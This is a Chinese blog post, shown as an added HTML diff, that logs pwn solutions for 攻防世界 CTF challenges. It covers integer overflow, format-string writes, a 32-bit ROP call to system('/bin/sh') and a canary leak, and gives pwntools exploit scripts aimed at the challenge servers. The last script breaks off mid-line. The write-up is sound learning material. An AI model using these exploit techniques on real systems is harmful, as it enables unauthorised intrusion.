@@ -1,0 +1,793 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#795548">
+  <meta name="description" content="">
+  <meta name="author" content="一叶枯舟">
+  <meta name="keywords" content="">
+  
+  <title>攻防世界刷题记录 - 一叶枯舟</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>一叶枯舟</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="攻防世界刷题记录">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-12-13 22:26" pubdate>
+        2020年12月13日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      7.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      104
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">攻防世界刷题记录</h1>
+            
+            <div class="markdown-body">
+              <h1 id="攻防世界-pwn-int_overflow-整数溢出"><a class="markdownIt-Anchor" href="#攻防世界-pwn-int_overflow-整数溢出"></a> 攻防世界-pwn-int_overflow-整数溢出</h1>
+<p>1.先检查程序，没有开启canary和pie</p>
+<p>​         <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101322876.png" srcset="/img/loading.gif" lazyload alt="image-20210413101322876"></p>
+<p>2.使用ida查看函数，main函数里会让你输入一个数字，当输入1时调用login()</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101524638.png" srcset="/img/loading.gif" lazyload alt="image-20210413101524638"></p>
+<p>查看login()函数</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101553522.png" srcset="/img/loading.gif" lazyload alt="image-20210413101553522"></p>
+<p>这里的第二个read函数读取的长度为0x199</p>
+<p>然后再查看check_passwd函数</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101615917.png" srcset="/img/loading.gif" lazyload alt="image-20210413101615917"></p>
+<p>这里的v3是unsigned_int8型，存储8个字节，最多存储256个长度，这里可以进行整数溢出，下面的代码只要v3&gt;3或者v3&lt;8就可以通过验证，所以v3可以是259-264或者3-8个长度</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101639471.png" srcset="/img/loading.gif" lazyload alt="image-20210413101639471"></p>
+<p>3.继续观察函数，发现下面存在strcpy()函数存在栈溢出，但是&amp;dest的栈有14个字节，所以我们得让v3整数溢出通过上面的判断，然后在偏移为14+ebp的时候写入后门函数的地址</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101700572.png" srcset="/img/loading.gif" lazyload alt="image-20210413101700572"></p>
+<p>后门函数地址为0x0804868B</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101715484.png" srcset="/img/loading.gif" lazyload alt="image-20210413101715484"></p>
+<p>所以编写payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>cat_flag=<span class="hljs-number">0x0804868B</span>  <span class="hljs-comment">#后门函数地址</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;39309&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Please input your username:\n&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>)<br>payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(cat_flag)+<span class="hljs-string">&#x27;A&#x27;</span>*(<span class="hljs-number">260</span>-<span class="hljs-number">0x14</span>-<span class="hljs-number">4</span>-<span class="hljs-number">4</span>)  <br><span class="hljs-comment">#&#x27;A&#x27;*0x14是到栈底的偏移量，&#x27;a&#x27;*4是ebp，最后填充的A需要补充长度到260才能导致整数溢出</span><br>p.sendlineafter(<span class="hljs-string">&quot;Please input your passwd:\n&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+<h1 id="攻防世界-pwn-cgfsb-格式化字符串写入"><a class="markdownIt-Anchor" href="#攻防世界-pwn-cgfsb-格式化字符串写入"></a> 攻防世界-pwn-CGfsb-格式化字符串写入</h1>
+<p>1.首先检查程序</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102120434.png" srcset="/img/loading.gif" lazyload alt="image-20210413102120434"></p>
+<p>32位程序，开启了canary保护和nx</p>
+<p>2.用ida打开查看函数，发现其中有一个printf(&amp;s)存在明显的栈溢出</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102138548.png" srcset="/img/loading.gif" lazyload alt="image-20210413102138548"></p>
+<p>在第二次输入message时输入aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p可以知道偏移为10</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102154558.png" srcset="/img/loading.gif" lazyload alt="image-20210413102154558"></p>
+<p>3.再次查看函数，里面有一段判断如果pwnme=8，则得到flag，所以我们可以用格式化字符串的漏洞覆盖pwnme的值</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102219355.png" srcset="/img/loading.gif" lazyload alt="image-20210413102219355"></p>
+<p>4.用ida查看pwnme的地址为0x0804A068，写出payload</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102248705.png" srcset="/img/loading.gif" lazyload alt="image-20210413102248705"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;39393&#x27;</span>)<br>pwnme_addr=<span class="hljs-number">0x0804A068</span>         <span class="hljs-comment">#pwnme的地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;please tell me your name:\n&quot;</span>,<span class="hljs-string">&quot;abab&quot;</span>)<br>payload=p32(pwnme_adddr)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">&#x27;%10$n&#x27;</span>    <br><span class="hljs-comment">#利用格式化字符串在pwnme的地址写入8，因为pwnme的地址占4字节，再补充4*a到8，就可以使pwnme的值为8</span><br>p.sendlineafter(<span class="hljs-string">&quot;leave your message please:\n&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+<h1 id="攻防世界-pwn-cgpwn2-32位rop链构造"><a class="markdownIt-Anchor" href="#攻防世界-pwn-cgpwn2-32位rop链构造"></a> 攻防世界-pwn-cgpwn2-32位rop链构造</h1>
+<p>1.先用checksec检查程序的保护</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102641981.png" srcset="/img/loading.gif" lazyload alt="image-20210413102641981"></p>
+<p>没有开启canary，然后使用ida查看代码，发现hello函数有一次存在栈溢出</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102711827.png" srcset="/img/loading.gif" lazyload alt="image-20210413102711827"></p>
+<p>并且发现name存在于bss中的地址是固定的0x0804A080</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102724230.png" srcset="/img/loading.gif" lazyload alt="image-20210413102724230"></p>
+<p>我们可以在name这个地方存储’/bin/sh’作为system的参数调用</p>
+<p>Hello函数中存在一个get函数作为溢出点</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102741169.png" srcset="/img/loading.gif" lazyload alt="image-20210413102741169"></p>
+<p>离栈底为0x26</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102759807.png" srcset="/img/loading.gif" lazyload alt="image-20210413102759807"></p>
+<p>这时可以编写payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>elf = ELF(<span class="hljs-string">&quot;./cgpwn2&quot;</span>)<br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;50628&#x27;</span>)<br><br>sys_addr=elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]   <span class="hljs-comment">#获取system的地址</span><br>name_addr=<span class="hljs-number">0x804a080</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;please tell me your name\n&quot;</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)   <span class="hljs-comment">#将/bin/sh写入name</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x26</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(sys_addr)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(name_addr)     <span class="hljs-comment">#32位的程序rop链构造，name中存放的数据作为system的参数</span><br>p.sendlineafter(<span class="hljs-string">&quot;hello,you can leave some message here:\n&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+<h1 id="攻防世界-pwn-forgot-栈溢出"><a class="markdownIt-Anchor" href="#攻防世界-pwn-forgot-栈溢出"></a> 攻防世界 pwn-forgot-栈溢出</h1>
+<ol>
+<li>先检查程序，发现只开启了nx保护</li>
+</ol>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103114866.png" srcset="/img/loading.gif" lazyload alt="image-20210413103114866"></p>
+<ol start="2">
+<li>观察函数发现scanf函数存在栈溢出。</li>
+</ol>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103154789.png" srcset="/img/loading.gif" lazyload alt="image-20210413103154789"></p>
+<p>再次观察其他函数发现存在一个后门函数可以直接拿到flag</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103221109.png" srcset="/img/loading.gif" lazyload alt="image-20210413103221109"></p>
+<p>先使用gdb进行调试，随便输入一些数据，发现最后返回的在ida里地址为0x80486CC的函数，在主函数中定义为v4</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103238325.png" srcset="/img/loading.gif" lazyload alt="image-20210413103238325"></p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103251099.png" srcset="/img/loading.gif" lazyload alt="image-20210413103251099"></p>
+<p>观察ida里其他函数，发现一个后门函数，地址为0x80486CC考虑使用栈溢出去执行它</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103303074.png" srcset="/img/loading.gif" lazyload alt="image-20210413103303074"></p>
+<p>在ida中查看栈空间可知，v4函数距离scantf输入的变量v2的偏移量为0x24</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103429828.png" srcset="/img/loading.gif" lazyload alt="image-20210413103429828"></p>
+<p>编写payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">33397</span>)<br>backaddr=<span class="hljs-number">0x80486CC</span>     <span class="hljs-comment">#后门函数地址</span><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;text&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+p32(backaddr)     <span class="hljs-comment">#覆盖v4的地址为后门函数</span><br>p.sendline(payload)<br>p.interactive()	<br></code></pre></td></tr></table></figure>
+<h1 id="攻防世界-pwn-mary_morton-格式化字符串泄露canary"><a class="markdownIt-Anchor" href="#攻防世界-pwn-mary_morton-格式化字符串泄露canary"></a> 攻防世界 pwn-Mary_Morton-格式化字符串泄露canary</h1>
+<ol>
+<li>先查看程序，发现没有开启地址随机化</li>
+</ol>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103823331.png" srcset="/img/loading.gif" lazyload alt="image-20210413103823331"></p>
+<ol start="2">
+<li>进行调试，发现程序让你会让你选择漏洞</li>
+</ol>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103844363.png" srcset="/img/loading.gif" lazyload alt="image-20210413103844363"></p>
+<ol start="3">
+<li>用ida打开程序，发现在选择格式化字符串（2）的时候会调用一个printf函数，存在格式化字符串漏洞</li>
+</ol>
+<p>主函数</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103904120.png" srcset="/img/loading.gif" lazyload alt="image-20210413103904120"></p>
+<p>函数sub_4008EB</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103919834.png" srcset="/img/loading.gif" lazyload alt="image-20210413103919834"></p>
+<p>由于程序开启了canary保护，所以得先通过格式化字符串泄露出canary的值，才能覆盖返回地址达到开启后门函数的目的。</p>
+<p>查看栈空间，发现canary的值距离buf的位置是0x90-0x8=0x88，该程序是64位程序，一个格式化字符串占8字节，0x88/8=17，再通过格式化字符串判断偏移量</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103935012.png" srcset="/img/loading.gif" lazyload alt="image-20210413103935012"></p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103953632.png" srcset="/img/loading.gif" lazyload alt="image-20210413103953632"></p>
+<p>4.测试字符串的偏移，输入aaaa %p %p %p %p %p %p %p %p %p</p>
+<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104113264.png" srcset="/img/loading.gif" lazyload alt="image-20210413104113264"></p>
+<p>根据回显可以知道偏移为6所以buf到var_8偏移为17+6=23</p>
+<p>5.观察其他函数，发现有一个后门函数可以得到flag，地址为0x4008DA</p>
+<p>​     <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104124884.png" srcset="/img/loading.gif" lazyload alt="image-20210413104124884"></p>
+<p>6.思路为先通过格式化字符串得到canary的值，然后再通过栈溢出去执行后门函数，得到flag，所以编写payload为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary=<span class="hljs-string">&#x27;Mary_Morton&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#io=process(&#x27;./Mary_Morton&#x27;)</span><br>io = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">45232</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;3. Exit the battle \n&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>catflag=<span class="hljs-number">0x4008DA</span>        <span class="hljs-comment">#后门函数的地址</span><br>payload = <span class="hljs-string">&quot;%23$p&quot;</span>       <span class="hljs-comment">#buf距离canary值的偏移为23</span><br>io.sendline(payload)<br>Canary=<span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)   <span class="hljs-comment">#得到canary的值</span><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary))<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span 